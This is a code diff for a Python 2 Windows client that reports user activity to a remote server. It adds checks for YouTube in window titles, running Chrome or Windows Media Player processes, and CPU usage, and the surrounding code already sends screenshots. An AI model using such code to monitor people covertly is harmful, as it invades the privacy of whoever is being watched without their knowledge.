@@ -23,7 +23,9 @@ import win32gui
 import time
 from PIL import ImageGrab
 import os
-import httplib
+import psutil
+import multiprocessing
+import ctypes
 ###############################
 ########  VARIABLES  ##########
 ###############################
@@ -123,17 +125,62 @@ class Client(object):
         mass=self.client.recv(1024)
         if mass=="image_sent":
             print picname,"sent"
+    #-------------------------------------------------------------------------------------------------------------------
+
+    def WindowTitles(self):
+        found=False
+        EnumWindows = ctypes.windll.user32.EnumWindows
+        EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
+        GetWindowText = ctypes.windll.user32.GetWindowTextW
+        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
+        IsWindowVisible = ctypes.windll.user32.IsWindowVisible
+
+        titles = []
+        def foreach_window(hwnd, lParam):
+            if IsWindowVisible(hwnd):
+                length = GetWindowTextLength(hwnd)
+                buff = ctypes.create_unicode_buffer(length + 1)
+                GetWindowText(hwnd, buff, length + 1)
+                titles.append(buff.value)
+            return True
+        EnumWindows(EnumWindowsProc(foreach_window), 0)
+        for i in titles:
+            if "YouTube" in i:
+                found=True
+        if found==True:
+            self.client.send("User using youtube")
+        else:self.client.send("User not using youtube")
+
 
     #-------------------------------------------------------------------------------------------------------------------
 
-    def Check_Exceptions(self, proc):
+    def Check_Exceptions(self):
+        self.Check_Media("chrome.exe")
+        self.Check_Media("wmplayer.exe")
+
+        exception=False
+        NumberOfCores= multiprocessing.cpu_count()
+        CPU_USAGE= psutil.cpu_times_percent()[0]
+        if(NumberOfCores>2):
+            if(CPU_USAGE<5 or CPU_USAGE>80):
+                exception=True
+        else:
+            if(CPU_USAGE>70):
+                exception=True
+        if exception==False:
+            self.client.send("There is no exception in the CPU")
+        else: self.client.send("There is exception in the CPU")
+        self.WindowTitles()
+
+    #-------------------------------------------------------------------------------------------------------------------
+
+    def Check_Media(self, proc):
         check=self.CheckifProcess(proc)
         if check["if open"]==True:
             self.client.send("Client use "+proc)
         else: self.client.send("Client don't use "+proc)
 
-    #-------------------------------------------------------------------------------------------------------------------0
-
+    #-------------------------------------------------------------------------------------------------------------------
     def send(self, t):
         i=1
         while(i<=t):
@@ -145,8 +192,8 @@ class Client(object):
         self.running = True
         while self.running:
             try:
-                self.Check_Exceptions("chrome.exe")
-                self.Check_Exceptions("wmplayer.exe")
+                self.Check_Exceptions()
+
                 data = self.client.recv(BUFFER)
                 print data
                 if "exe" in data:
